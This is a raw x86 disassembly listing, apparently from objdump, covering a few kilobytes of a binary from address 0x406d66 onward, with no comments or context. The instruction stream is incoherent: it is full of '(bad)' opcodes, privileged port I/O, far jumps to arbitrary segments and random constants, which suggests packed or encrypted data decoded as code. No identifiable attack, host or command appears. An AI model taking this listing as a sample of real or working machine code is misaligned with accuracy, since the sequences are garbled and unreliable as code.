  406d66:	push   ecx
  406d67:	dec    ecx
  406d68:	pop    ebp
  406d69:	mov    eax,DWORD PTR [eax]
  406d6b:	fild   QWORD PTR [ecx+0x68]
  406d6e:	ja     0x406dbd
  406d70:	cwde   
  406d71:	test   eax,0xe5095b0a
  406d76:	jl     0x406dca
  406d78:	pop    edx
  406d79:	dec    ebp
  406d7a:	xor    al,0xf8
  406d7c:	ins    DWORD PTR es:[edi],dx
  406d7d:	and    DWORD PTR [edx+0x4f],ecx
  406d80:	scas   eax,DWORD PTR es:[edi]
  406d81:	dec    edi
  406d82:	andps  xmm3,XMMWORD PTR [ebx]
  406d85:	out    0x9b,al
  406d87:	(bad)  
  406d89:	push   ebx
  406d8a:	jp     0x406dd4
  406d8c:	imul   ch
  406d8e:	jne    0x406d83
  406d90:	mov    cl,0xe8
  406d92:	lahf   
  406d93:	and    eax,0x54acc409
  406d98:	mov    eax,ds:0x6323a8c
  406d9d:	(bad)  
  406d9e:	push   eax
  406d9f:	push   ss
  406da0:	lea    edx,[esi+0x69]
  406da3:	fsub   DWORD PTR [edx+0x6f]
  406da6:	add    BYTE PTR [eax+0x45],ch
  406da9:	jnp    0x406d32
  406dab:	xchg   ecx,eax
  406dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dad:	pop    ss
  406dae:	jo     0x406e17
  406db0:	cdq    
  406db1:	add    BYTE PTR [edx],ch
  406db3:	pop    es
  406db4:	push   edi
  406db5:	inc    ebp
  406db6:	push   es
  406db7:	rcr    BYTE PTR [edi+0x56],1
  406dba:	cwde   
  406dbb:	fxch   st(5)
  406dbd:	mov    bh,0x65
  406dbf:	xor    al,0x32
  406dc1:	mov    bl,0xcd
  406dc3:	or     BYTE PTR ds:0x5a1d64d9,ch
  406dc9:	dec    edi
  406dca:	fst    DWORD PTR [edi]
  406dcc:	ficom  WORD PTR [ebx+0x7a]
  406dcf:	xor    eax,DWORD PTR [ebx-0x4be04c44]
  406dd5:	bound  edx,QWORD PTR [ebx+0x392578b5]
  406ddb:	mov    ebx,0x18571f84
  406de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406de1:	push   ebp
  406de2:	dec    edi
  406de3:	dec    esi
  406de4:	jge    0x406dd7
  406de6:	mov    eax,0x4f1256b6
  406deb:	(bad)  
  406dec:	not    BYTE PTR ds:0xa035389
  406df2:	pop    eax
  406df3:	dec    esi
  406df4:	dec    ebx
  406df5:	fstp   st(5)
  406df7:	inc    ecx
  406df8:	loope  0x406d9e
  406dfa:	fadd   DWORD PTR [eax+0x50]
  406dfd:	es jmp 0x1af3281e
  406e03:	(bad)  
  406e04:	popa   
  406e05:	jp     0x406e66
  406e07:	sahf   
  406e08:	ins    BYTE PTR es:[edi],dx
  406e09:	push   es
  406e0a:	aas    
  406e0b:	sub    BYTE PTR [esp+ecx*1],dh
  406e0e:	jns    0x406e23
  406e10:	xlat   BYTE PTR ds:[ebx]
  406e11:	mov    ds:0xceb59cc0,al
  406e16:	dec    edx
  406e17:	call   0x2bae:0xa40f2c9f
  406e1e:	and    al,0xc
  406e20:	(bad)  
  406e21:	adc    esi,DWORD PTR [edi+0x403b9931]
  406e27:	sti    
  406e28:	jno    0x406ded
  406e2a:	xchg   esp,eax
  406e2b:	and    eax,0xcfb89df7
  406e30:	js     0x406ea7
  406e32:	mov    ecx,0x79c2aec9
  406e37:	(bad)  
  406e38:	or     esp,DWORD PTR [edi-0x5f]
  406e3b:	adc    dl,BYTE PTR [ecx+0xa7f189]
  406e41:	cmp    al,0x1c
  406e43:	inc    ebx
  406e44:	in     eax,dx
  406e45:	pop    esp
  406e46:	xchg   ebp,eax
  406e47:	sbb    al,0x64
  406e49:	mov    eax,ds:0xe14c06d3
  406e4e:	int    0x68
  406e50:	xchg   edx,eax
  406e51:	and    eax,0x66c8abfc
  406e56:	nop
  406e57:	pop    ds
  406e58:	adc    bh,BYTE PTR [edx+0x763d8e6]
  406e5e:	pop    ss
  406e5f:	cs mov dl,0x6a
  406e62:	fistp  DWORD PTR [edx-0x2fdc855f]
  406e68:	dec    esi
  406e69:	jb     0x406e16
  406e6b:	(bad)  
  406e6c:	in     al,0xf3
  406e6e:	or     esi,DWORD PTR [ecx+0x5f]
  406e71:	jle    0x406e74
  406e73:	mov    ah,0x25
  406e75:	push   edx
  406e76:	loope  0x406e53
  406e78:	xchg   edi,eax
  406e79:	push   0x62
  406e7b:	sbb    al,0x2b
  406e7d:	ss mov bh,0x1a
  406e80:	push   esp
  406e81:	mov    ebp,DWORD PTR [edx]
  406e83:	adc    eax,0x166efccc
  406e88:	addr16 inc eax
  406e8a:	or     BYTE PTR [eax-0x33852411],0x97
  406e91:	mov    cl,0xd
  406e93:	jno    0x406f12
  406e95:	push   0xffffffef
  406e97:	xor    BYTE PTR [ebx+0x64dbdbb9],cl
  406e9d:	jmp    0x406e41
  406e9f:	stos   DWORD PTR es:[edi],eax
  406ea0:	test   DWORD PTR [eax],edx
  406ea2:	lock out dx,al
  406ea4:	test   eax,0x499ede43
  406ea9:	retf   0x405d
  406eac:	retf   0x16d4
  406eaf:	das    
  406eb0:	jnp    0x406f19
  406eb2:	iret   
  406eb3:	and    al,0x4a
  406eb5:	icebp  
  406eb6:	repz dec ecx
  406eb8:	sub    al,0xf6
  406eba:	or     al,BYTE PTR [ebx+0x65a0390d]
  406ec0:	xchg   ebx,eax
  406ec1:	std    
  406ec2:	mov    BYTE PTR [esi-0x2f81f965],0x3b
  406ec9:	pop    esi
  406eca:	sub    al,0x9d
  406ecc:	out    0x33,al
  406ece:	scas   eax,DWORD PTR es:[edi]
  406ecf:	lods   al,BYTE PTR ds:[esi]
  406ed0:	adc    al,0xe
  406ed2:	mov    ds:0xa7ed375,al
  406ed7:	adc    BYTE PTR [ebx],ch
  406ed9:	sar    BYTE PTR [ecx],cl
  406edb:	add    BYTE PTR cs:[ebp+0x18],0x3f
  406ee0:	inc    esp
  406ee1:	xchg   ebx,eax
  406ee2:	mov    ebx,0xb086aaee
  406ee7:	pop    ebx
  406ee8:	rcl    DWORD PTR [ebp-0x6d33c53e],cl
  406eee:	addr16 es cli 
  406ef1:	push   edx
  406ef2:	mov    esi,0x2705662d
  406ef7:	outs   dx,DWORD PTR ds:[esi]
  406ef8:	lahf   
  406ef9:	shl    ah,cl
  406efb:	retf   
  406efc:	xlat   BYTE PTR ds:[ebx]
  406efd:	cmp    ecx,ecx
  406eff:	push   0xffffff98
  406f01:	mov    al,0x60
  406f03:	inc    esp
  406f04:	cmp    ecx,DWORD PTR [esp+ecx*8]
  406f07:	lds    ebx,FWORD PTR [eax]
  406f09:	or     BYTE PTR [esi-0x35edc1a],ch
  406f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f10:	pushf  
  406f11:	dec    ebx
  406f12:	into   
  406f13:	fcmovbe st,st(2)
  406f15:	jle    0x406eb4
  406f17:	ret    0xb3b4
  406f1a:	jmp    0xde3b:0x59a2c13d
  406f21:	in     al,dx
  406f22:	pop    edx
  406f23:	ficomp DWORD PTR [eax]
  406f25:	adc    DWORD PTR [ecx-0x22],edx
  406f28:	jle    0x406f12
  406f2a:	je     0x406f95
  406f2c:	in     eax,dx
  406f2d:	loopne 0x406f0e
  406f2f:	mov    cl,0xd4
  406f31:	xlat   BYTE PTR ds:[ebx]
  406f32:	and    eax,0x642dcef2
  406f37:	iret   
  406f38:	test   DWORD PTR [ebx+0x1a],esp
  406f3b:	nop
  406f3c:	jne    0x406f0e
  406f3e:	inc    esi
  406f40:	dec    BYTE PTR [ecx+0x4604a43d]
  406f46:	mov    ebp,DWORD PTR [bx-0x4f58]
  406f4b:	test   BYTE PTR [ebx+0x39cac8df],cl
  406f51:	inc    edx
  406f52:	cs loopne 0x406f99
  406f55:	(bad)  
  406f56:	jbe    0x406f7d
  406f58:	push   esi
  406f59:	loop   0x406f24
  406f5b:	mov    esp,0xf16c0730
  406f60:	pop    edx
  406f61:	ret    0xc849
  406f64:	loopne 0x406f9b
  406f66:	xchg   edx,eax
  406f67:	les    edx,FWORD PTR [ecx+0x74]
  406f6a:	sub    al,BYTE PTR [ecx+0x664a46c6]
  406f70:	adc    edx,eax
  406f72:	adc    al,0x79
  406f74:	stos   DWORD PTR es:[edi],eax
  406f75:	nop
  406f76:	fs push cs
  406f78:	lods   eax,DWORD PTR ds:[esi]
  406f79:	inc    ecx
  406f7a:	sahf   
  406f7b:	idiv   DWORD PTR [edx+0x568d3d25]
  406f81:	mov    BYTE PTR [ebp-0x43308c1],ah
  406f87:	loopne 0x406f57
  406f89:	mov    ecx,0xa2888272
  406f8e:	fild   DWORD PTR [ebp-0x19]
  406f91:	mov    edx,0x517e21c4
  406f96:	or     ch,al
  406f98:	adc    DWORD PTR [esi+0x8],edx
  406f9b:	div    DWORD PTR [edi-0x33d26075]
  406fa1:	inc    esi
  406fa2:	add    BYTE PTR [ebp+0x54],dl
  406fa5:	xchg   esp,eax
  406fa6:	pop    eax
  406fa7:	mov    al,ds:0xd341ec73
  406fac:	push   eax
  406fad:	test   al,ch
  406faf:	jbe    0x406ff7
  406fb1:	cs int3 
  406fb3:	inc    esp
  406fb4:	dec    ebp
  406fb5:	inc    ebx
  406fb6:	adc    BYTE PTR [ebx],0xef
  406fb9:	mov    ecx,0x29a394b2
  406fbe:	add    eax,0x555a633a
  406fc3:	stos   BYTE PTR es:[edi],al
  406fc4:	adc    eax,0x3f54cde2
  406fc9:	mov    dl,0xf6
  406fcb:	or     BYTE PTR [esi],al
  406fcd:	out    0x16,eax
  406fcf:	sub    BYTE PTR [eax+0x65c6ddd1],bl
  406fd5:	mov    bl,0xf
  406fd7:	jmp    0x5f0f9c7e
  406fdc:	repz arpl WORD PTR [edx],sp
  406fdf:	and    DWORD PTR [edx+0x6c13002],eax
  406fe5:	sti    
  406fe6:	push   0x6ae79b8f
  406feb:	in     eax,0x2a
  406fed:	pop    ecx
  406fee:	sbb    BYTE PTR [esi+0x7e127a76],cl
  406ff4:	inc    ecx
  406ff5:	mov    BYTE PTR [ebp-0x4292be3b],ah
  406ffb:	or     dh,ah
  406ffd:	inc    ebx
  406ffe:	clc    
  406fff:	inc    ecx
  407000:	mov    al,0x4b
  407002:	push   esp
  407003:	cmp    bh,BYTE PTR [ecx+0x2b]
  407006:	lahf   
  407007:	xchg   ecx,eax
  407008:	inc    esi
  407009:	inc    ebx
  40700a:	push   ebp
  40700b:	std    
  40700c:	push   esi
  40700d:	in     al,0x57
  40700f:	inc    edx
  407010:	mov    DWORD PTR [edi+0x432f74dd],esp
  407016:	dec    ebx
  407017:	imul   ecx,eax,0x57
  40701a:	or     DWORD PTR [ecx],eax
  40701c:	push   edx
  40701d:	or     DWORD PTR [edi-0x78],ebp
  407020:	pop    edi
  407021:	imul   esi,DWORD PTR [ebx+0x5fbfc61e],0x9ff3a03f
  40702b:	mov    ch,0xe7
  40702d:	je     0x406fc5
  40702f:	jno    0x406ffa
  407031:	pusha  
  407032:	(bad)  
  407033:	pop    esi
  407034:	add    DWORD PTR [ebx+0x4c],esi
  407037:	sub    ebx,DWORD PTR [ebp-0xe6a339f]
  40703d:	jl     0x407008
  40703f:	adc    DWORD PTR [eax-0x15e47725],0xffffffb7
  407046:	(bad)  
  407047:	(bad)  
  407048:	xchg   esi,eax
  407049:	and    DWORD PTR [edx],0xa1b98851
  40704f:	dec    edx
  407050:	(bad)  
  407051:	sbb    eax,0x904172a2
  407056:	add    eax,0xbe357011
  40705b:	cmp    ah,al
  40705d:	aaa    
  40705e:	push   edi
  40705f:	addr16 hlt 
  407061:	daa    
  407062:	adc    eax,0x44bbfc58
  407067:	retf   0xeb5e
  40706a:	int3   
  40706b:	pop    ebx
  40706c:	xlat   BYTE PTR ds:[ebx]
  40706d:	or     esp,DWORD PTR [edi]
  40706f:	lock fcmove st,st(7)
  407072:	and    al,0xa
  407074:	fbstp  TBYTE PTR [ecx+ebx*2-0x2e]
  407078:	jns    0x4070c5
  40707a:	shr    esp,1
  40707c:	out    0x6a,eax
  40707e:	and    edx,DWORD PTR [ebx]
  407080:	mov    edx,DWORD PTR [eax]
  407082:	and    eax,0xb795142a
  407087:	stos   DWORD PTR es:[edi],eax
  407088:	mov    cl,0xf8
  40708a:	icebp  
  40708b:	pop    edi
  40708c:	xor    eax,0x8f4b900f
  407091:	pop    ecx
  407092:	nop
  407093:	xor    DWORD PTR [esi],ebx
  407095:	cmp    ecx,ebx
  407097:	dec    ebx
  407098:	and    bh,BYTE PTR [esi+0x4b]
  40709b:	push   es
  40709c:	jne    0x40707e
  40709e:	sbb    eax,0xe49dc94
  4070a3:	retf   0x42
  4070a6:	pop    eax
  4070a7:	xchg   esp,eax
  4070a8:	sub    dh,0x14
  4070ab:	fst    QWORD PTR [ebx+0x2b0c0a1c]
  4070b1:	pop    ecx
  4070b2:	mov    al,ah
  4070b4:	jecxz  0x407101
  4070b6:	out    0xc6,al
  4070b8:	into   
  4070b9:	jns    0x407057
  4070bb:	mov    ch,0x8b
  4070bd:	lahf   
  4070be:	jno    0x40705b
  4070c0:	fadd   QWORD PTR [ebp+0x448ff16b]
  4070c6:	inc    edi
  4070c7:	push   ebp
  4070c8:	pop    ds
  4070c9:	enter  0x79cd,0x8f
  4070cd:	jmp    0xca584649
  4070d2:	cmp    al,0xe6
  4070d4:	int    0xa
  4070d6:	loopne 0x407092
  4070d8:	cmp    bh,ch
  4070da:	(bad)  
  4070db:	hlt    
  4070dc:	test   esp,ebp
  4070de:	push   esi
  4070df:	xchg   edi,eax
  4070e0:	ja     0x4070c4
  4070e2:	sub    bl,dh
  4070e4:	sub    DWORD PTR [eax],ebp
  4070e6:	enter  0x5ea2,0xd9
  4070ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070eb:	or     ch,bh
  4070ed:	adc    BYTE PTR [edx],al
  4070ef:	ret    0xd1ae
  4070f2:	inc    eax
  4070f3:	ret    0x511
  4070f6:	popa   
  4070f7:	shl    BYTE PTR [ecx+0x2a],cl
  4070fa:	jl     0x4070b1
  4070fc:	fiadd  DWORD PTR [edi-0x38ec7c72]
  407102:	jg     0x4070d9
  407104:	fs push esi
  407106:	mov    al,0x80
  407108:	cld    
  407109:	outs   dx,DWORD PTR ds:[esi]
  40710a:	xor    DWORD PTR [edi],edi
  40710c:	mov    edx,0x6d4283ff
  407111:	aaa    
  407112:	and    DWORD PTR [esi],ebx
  407114:	loopne 0x4070c4
  407116:	xor    al,0xa4
  407118:	mov    edx,0x15716ef9
  40711d:	aad    0xa9
  40711f:	ret    0x3230
  407122:	fcom   st(7)
  407124:	inc    eax
  407125:	adc    eax,0x562c338
  40712a:	jl     0x407137
  40712c:	push   eax
  40712d:	inc    ecx
  40712e:	popa   
  40712f:	pop    eax
  407130:	js     0x407121
  407132:	push   ebx
  407133:	(bad)  
  407134:	jmp    0x407122
  407136:	xchg   edx,eax
  407137:	(bad)  
  407138:	xlat   BYTE PTR ds:[ebx]
  407139:	iret   
  40713a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40713b:	ja     0x407150
  40713d:	xor    eax,0xe7b1f712
  407142:	adc    ebp,DWORD PTR [ecx+esi*1]
  407145:	mov    al,ds:0x7d6fe9d3
  40714a:	dec    edi
  40714b:	pop    ecx
  40714c:	mov    dl,0x54
  40714e:	aam    0x54
  407150:	xchg   ebp,eax
  407151:	cdq    
  407152:	jb     0x407163
  407154:	cmp    edx,eax
  407156:	mov    ch,0x9f
  407158:	and    ah,al
  40715a:	das    
  40715b:	clc    
  40715c:	xor    dl,BYTE PTR [esi]
  40715e:	gs (bad) 
  407160:	sahf   
  407161:	jmp    0x407160
  407163:	jge    0x407109
  407165:	hlt    
  407166:	push   0x50c54bec
  40716b:	rcl    edi,0x83
  40716e:	jb     0x407183
  407170:	int    0x60
  407172:	mov    cl,0x99
  407174:	lea    ebp,[ebx]
  407176:	inc    esp
  407177:	mov    al,0x6e
  407179:	outs   dx,DWORD PTR ds:[esi]
  40717a:	mov    ds:0xdb0335e2,eax
  40717f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407180:	mov    WORD PTR [edi-0x61],ds
  407183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407184:	arpl   ax,si
  407186:	adc    al,0xcf
  407188:	sbb    eax,0xf1e33ec2
  40718d:	lods   eax,DWORD PTR ds:[esi]
  40718e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40718f:	mov    al,0xfc
  407191:	adc    eax,0xbd69ba72
  407196:	sbb    bl,0x93
  407199:	mov    ah,0xd4
  40719b:	or     DWORD PTR [ebx],esp
  40719d:	dec    ebx
  40719e:	lods   eax,DWORD PTR ds:[esi]
  40719f:	mov    bh,0x15
  4071a1:	imul   edx,DWORD PTR ds:0x672eb743,0x2935c92b
  4071ab:	dec    eax
  4071ac:	retf   0x264
  4071af:	jbe    0x407199
  4071b1:	loopne 0x407177
  4071b3:	dec    edi
  4071b4:	leave  
  4071b5:	mul    DWORD PTR [edx+0x8]
  4071b8:	inc    eax
  4071b9:	push   es
  4071ba:	push   ebp
  4071bb:	arpl   WORD PTR [edx-0x168b4782],di
  4071c1:	loop   0x407209
  4071c3:	push   0xffffffe8
  4071c5:	leave  
  4071c6:	mov    bh,0x77
  4071c8:	pop    ebx
  4071c9:	in     eax,0xcb
  4071cb:	sbb    eax,0x796f64ae
  4071d0:	push   ebp
  4071d1:	adc    cl,0x9a
  4071d4:	stos   DWORD PTR es:[edi],eax
  4071d5:	and    dl,BYTE PTR [ecx-0x4740d9d2]
  4071db:	or     eax,0x4ca6ff3b
  4071e0:	lock sub bl,BYTE PTR [edx-0x19e531e8]
  4071e7:	jg     0x407212
  4071e9:	pop    ds
  4071ea:	add    ebx,esi
  4071ec:	mov    ah,0xd8
  4071ee:	push   ebx
  4071ef:	mov    dl,al
  4071f1:	int3   
  4071f2:	shl    dh,cl
  4071f4:	mov    bh,0x4f
  4071f6:	scas   al,BYTE PTR es:[edi]
  4071f7:	dec    esp
  4071f8:	pop    ebp
  4071f9:	dec    ebx
  4071fa:	inc    esp
  4071fb:	iret   
  4071fc:	pushf  
  4071fd:	int3   
  4071fe:	adc    dh,ah
  407200:	xchg   esi,eax
  407201:	sub    al,0x6a
  407203:	mov    dh,0xfd
  407205:	pop    ds
  407206:	mov    DWORD PTR [ebx-0x751d56df],esp
  40720c:	iret   
  40720d:	call   0xa0e3:0xe03724e
  407214:	and    BYTE PTR [ebx+0x7c],0xa3
  407218:	pop    ds
  407219:	les    edi,FWORD PTR [ecx+0x5fcf0ed4]
  40721f:	out    0xe7,al
  407221:	mov    ebp,0x82590dd4
  407226:	bound  ecx,QWORD PTR [eax]
  407228:	lock loope 0x40725b
  40722b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40722c:	xchg   esi,eax
  40722d:	or     bl,BYTE PTR [esi]
  40722f:	ins    BYTE PTR es:[edi],dx
  407230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407231:	pop    edx
  407232:	in     eax,dx
  407233:	jb     0x4071c5
  407235:	js     0x4071e7
  407237:	cmp    al,0xeb
  407239:	fmul   DWORD PTR [edi]
  40723b:	sbb    BYTE PTR [edx-0x3928230a],dh
  407241:	or     edi,DWORD PTR [ebx]
  407243:	aaa    
  407244:	fcom   DWORD PTR [ebx-0x6f7aac1a]
  40724a:	inc    eax
  40724b:	mov    dh,0x25
  40724d:	mov    ds:0xfd8372c4,eax
  407252:	jo     0x40724d
  407254:	iret   
  407255:	mov    bh,0xd
  407257:	aaa    
  407258:	stos   DWORD PTR es:[edi],eax
  407259:	lahf   
  40725a:	mov    edi,0x69c25d70
  40725f:	icebp  
  407260:	ja     0x407208
  407262:	out    dx,al
  407263:	inc    edx
  407264:	push   eax
  407265:	aaa    
  407266:	sbb    eax,DWORD PTR [eax+0x37aef669]
  40726c:	icebp  
  40726d:	mov    ds:0xb46efde4,eax
  407272:	bound  ebx,QWORD PTR ds:[edx-0x22de8b2a]
  407279:	(bad)  
  40727a:	cmp    eax,0x15a10aeb
  40727f:	into   
  407280:	xor    DWORD PTR [ebx-0x50],edx
  407283:	dec    ecx
  407284:	adc    al,0x92
  407286:	aad    0xc4
  407288:	jmp    0xe000:0x485d1432
  40728f:	adc    bl,al
  407291:	mov    edx,0xf7c3af3f
  407296:	cmp    eax,0xb7265794
  40729b:	sub    al,0x2
  40729d:	pop    edi
  40729e:	mov    es,WORD PTR [ebx+0x34]
  4072a1:	pop    edi
  4072a2:	and    ebx,DWORD PTR [ebp+0x61fdd3bd]
  4072a8:	push   ebx
  4072a9:	pop    ss
  4072aa:	les    edi,FWORD PTR [edi]
  4072ac:	push   ds
  4072ad:	push   ebx
  4072ae:	sub    DWORD PTR [ebx],0x69
  4072b1:	shl    DWORD PTR [eax+0x4684e7fa],0xfe
  4072b8:	pop    es
  4072b9:	sub    eax,edx
  4072bb:	add    al,BYTE PTR [ecx+0x52d6bdf3]
  4072c1:	retf   0x1624
  4072c4:	xchg   ebp,eax
  4072c5:	dec    ebp
  4072c6:	or     BYTE PTR [ebp+0x3ada798f],dl
  4072cc:	sti    
  4072cd:	ror    BYTE PTR [eax-0x1e],1
  4072d0:	test   BYTE PTR [ebp*8-0x45443836],ah
  4072d7:	lods   eax,DWORD PTR ds:[esi]
  4072d8:	cdq    
  4072d9:	xlat   BYTE PTR ds:[ebx]
  4072da:	pop    esi
  4072db:	rcl    ah,1
  4072dd:	push   esp
  4072de:	in     al,0xa1
  4072e0:	push   edx
  4072e1:	jmp    0x507c4708
  4072e6:	push   0x753b960f
  4072eb:	pop    ds
  4072ec:	hlt    
  4072ed:	bswap  esp
  4072ef:	inc    edi
  4072f0:	and    DWORD PTR [edi-0x60758c0e],ebx
  4072f6:	stc    
  4072f7:	and    eax,0x5218be12
  4072fc:	push   0x23b00990
  407301:	xlat   BYTE PTR ds:[ebx]
  407302:	adc    BYTE PTR [eax-0x6b],bl
  407305:	mov    DWORD PTR [eax-0x1f],0xb6779c51
  40730c:	inc    ebp
  40730d:	stc    
  40730e:	sti    
  40730f:	add    eax,0x1157c4c3
  407314:	retfw  0x79c3
  407318:	(bad)  
  407319:	xor    al,0x35
  40731b:	sbb    edx,esi
  40731d:	je     0x4072bf
  40731f:	mov    eax,0x3d0ef6a6
  407324:	xchg   edi,eax
  407325:	jnp    0x4072dc
  407327:	dec    esi
  407328:	lahf   
  407329:	inc    esp
  40732a:	ja     0x407372
  40732c:	imul   BYTE PTR [ecx+ebp*4]
  40732f:	cmc    
  407330:	pushf  
  407331:	loop   0x4073a8
  407333:	enter  0xb16c,0xf4
  407337:	test   DWORD PTR [edx-0x3a989859],esp
  40733d:	add    DWORD PTR [edi],esi
  40733f:	xchg   ecx,eax
  407340:	dec    ebx
  407341:	xchg   esp,eax
  407342:	fdivr  QWORD PTR [eax]
  407344:	jl     0x4072f9
  407346:	in     al,dx
  407347:	jne    0x407312
  407349:	jbe    0x4072cf
  40734b:	jo     0x40739f
  40734d:	rdmsr  
  40734f:	pop    ss
  407350:	data16 xor al,0xf9
  407353:	int    0x53
  407355:	in     al,dx
  407356:	dec    ebx
  407357:	and    esi,DWORD PTR [edi+0x18]
  40735a:	retf   0x70fc
  40735d:	lock scas al,BYTE PTR es:[edi]
  40735f:	loopne 0x40734a
  407361:	adc    ebx,esi
  407363:	pop    esp
  407364:	je     0x407340
  407366:	in     eax,dx
  407367:	pushf  
  407368:	mov    ah,dh
  40736a:	xlat   BYTE PTR ds:[ebx]
  40736b:	pop    es
  40736c:	xchg   ebx,eax
  40736d:	xor    BYTE PTR [edx+0x55],bl
  407370:	xor    eax,0xdefa315a
  407375:	and    BYTE PTR [ecx-0x5f376cb9],al
  40737b:	fcomp  DWORD PTR [ebx+edx*2+0x15]
  40737f:	mov    ds:0xe008f99c,al
  407384:	inc    BYTE PTR [ecx]
  407386:	pushf  
  407387:	es js  0x4073fb
  40738a:	cmp    ch,BYTE PTR [esi]
  40738c:	dec    esp
  40738d:	add    ch,bl
  40738f:	adc    bh,BYTE PTR [esi]
  407391:	test   DWORD PTR [ecx],esp
  407393:	cmp    ch,BYTE PTR [ebx]
  407395:	lahf   
  407396:	xchg   DWORD PTR [eax-0x12],ecx
  407399:	icebp  
  40739a:	cld    
  40739b:	fwait
  40739c:	jg     0x40732b
  40739e:	or     BYTE PTR [ebx-0x31],al
  4073a1:	pop    edx
  4073a2:	pop    eax
  4073a3:	mov    edi,0x4c43a137
  4073a8:	jae    0x4073bb
  4073aa:	je     0x40736a
  4073ac:	mov    ebp,0x96af9bf4
  4073b1:	shr    DWORD PTR [bp+si+0x56f5],cl
  4073b6:	mov    esp,DWORD PTR [edx+0x43be4ba2]
  4073bc:	popf   
  4073bd:	push   edi
  4073be:	push   cs
  4073bf:	gs and eax,0xc05000fd
  4073c5:	data16 sti 
  4073c7:	pop    ds
  4073c8:	data16 in al,0x15
  4073cb:	add    DWORD PTR [esi],ebx
  4073cd:	adc    eax,0x9c8e1cf4
  4073d2:	fs repz (bad) 
  4073d6:	pop    esp
  4073d7:	or     bh,BYTE PTR [edx]
  4073d9:	shr    al,0xb8
  4073dc:	pop    edi
  4073dd:	scas   eax,DWORD PTR es:[edi]
  4073de:	std    
  4073df:	and    ch,BYTE PTR [ebx]
  4073e1:	push   edi
  4073e2:	pop    ecx
  4073e3:	and    DWORD PTR [ebp-0x60],ecx
  4073e6:	xchg   edi,eax
  4073e7:	pop    eax
  4073e8:	outs   dx,BYTE PTR ds:[esi]
  4073e9:	sar    DWORD PTR [edi+0x2b],1
  4073ec:	push   esi
  4073ed:	(bad)  
  4073ef:	jl     0x40745f
  4073f1:	mov    cs,edi
  4073f3:	mov    dl,0x9a
  4073f5:	test   esp,edx
  4073f7:	mov    WORD PTR [eax-0x5eac47c9],gs
  4073fd:	aad    0xda
  4073ff:	pop    eax
  407400:	ret    
  407401:	iret   
  407402:	imul   esp,DWORD PTR [ebx-0xf],0xc73498b3
  407409:	sub    BYTE PTR [ebx+0x41ef7dd7],dh
  40740f:	ins    BYTE PTR es:[edi],dx
  407410:	push   ds
  407411:	mov    edi,0x5419b3df
  407416:	mov    ecx,0x969fe68f
  40741b:	sahf   
  40741c:	lea    esp,[ebp+eiz*4+0x2c]
  407420:	sti    
  407421:	pop    esp
  407422:	mov    WORD PTR [edx-0x6b],ss
  407425:	dec    eax
  407426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407427:	ss mov ebx,0x939e623d
  40742d:	out    0x5e,al
  40742f:	out    0xcc,al
  407431:	ins    DWORD PTR es:[edi],dx
  407432:	cmp    DWORD PTR [ecx],esi
  407434:	addr16 jmp 0x4073ca
  407437:	mov    edx,0x635e3c36
  40743c:	pusha  
  40743d:	aas    
  40743e:	aaa    
  40743f:	leave  
  407440:	ror    BYTE PTR [esi-0x9baf819],0x83
  407447:	shl    dl,1
  407449:	out    0xf6,al
  40744b:	jae    0x4074ac
  40744d:	sbb    ebx,DWORD PTR [ecx-0x80]
  407450:	adc    eax,0x24380701
  407455:	dec    edi
  407456:	aaa    
  407457:	cs sahf 
  407459:	mov    dl,0xfe
  40745b:	and    dl,BYTE PTR [edx+edx*8]
  40745e:	xlat   BYTE PTR ds:[ebx]
  40745f:	ret    0x207f
  407462:	sub    eax,0xe45d1ea9
  407467:	lea    ebp,[esp+eiz*2-0x37]
  40746b:	or     cl,BYTE PTR [edi-0x3df14dda]
  407471:	stos   DWORD PTR es:[edi],eax
  407472:	(bad)
  407475:	out    0x9d,al
  407477:	adc    DWORD PTR [ecx+0x34],eax
  40747a:	mov    cl,0x12
  40747c:	jo     0x4074b6
  40747e:	aad    0xc9
  407480:	adc    eax,0xc898eac9
  407485:	push   ebx
  407486:	sub    al,cl
  407488:	cmp    eax,0xfd1ff723
  40748d:	mov    edx,0x15189e3
  407492:	nop
  407493:	push   edi
  407494:	adc    ebx,DWORD PTR [ecx+ebp*8-0x74]
  407498:	cmc    
  407499:	setl   BYTE PTR [edi+0x70]
  40749d:	xor    bh,BYTE PTR ds:0xcbbead31
  4074a3:	pop    esi
  4074a4:	xchg   edi,eax
  4074a5:	(bad)  
  4074a6:	out    dx,al
  4074a7:	sub    esi,ebp
  4074a9:	test   BYTE PTR [esi+0xc],bh
  4074ac:	sbb    al,0xe5
  4074ae:	fidivr WORD PTR [ebx+0x6c]
  4074b1:	sub    BYTE PTR [esi],al
  4074b3:	inc    ebx
  4074b4:	cmp    al,0x61
  4074b6:	adc    cl,BYTE PTR [edi+0x5b14a73a]
  4074bc:	popf   
  4074bd:	add    dl,BYTE PTR [edx]
  4074bf:	cwde   
  4074c0:	cld    
  4074c1:	inc    ecx
  4074c2:	mov    esp,0x86b00b34
  4074c7:	pusha  
  4074c8:	stos   BYTE PTR es:[edi],al
  4074c9:	and    eax,0xe9ff5f74
  4074ce:	and    ebx,DWORD PTR [edi-0x27]
  4074d1:	ficom  DWORD PTR [ebx+0x2acb3a81]
  4074d7:	in     al,dx
  4074d8:	and    dh,BYTE PTR [eax]
  4074da:	jp     0x40745f
  4074dc:	mov    esi,0x64ccbede
  4074e1:	push   esi
  4074e2:	sbb    BYTE PTR [edi-0x66],ah
  4074e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e6:	dec    ebp
  4074e7:	rcl    al,1
  4074e9:	leave  
  4074ea:	imul   esp,DWORD PTR [ebp+0x4e],0x97775d58
  4074f1:	and    BYTE PTR [ebx-0x37],0xad
  4074f5:	cli    
  4074f6:	into   
  4074f7:	push   ss
  4074f8:	ror    BYTE PTR [ebp+0x7a1a5e52],cl
  4074fe:	mov    ebp,0x2bbdd0ff
  407503:	bound  ebp,QWORD PTR [edx+eax*4]
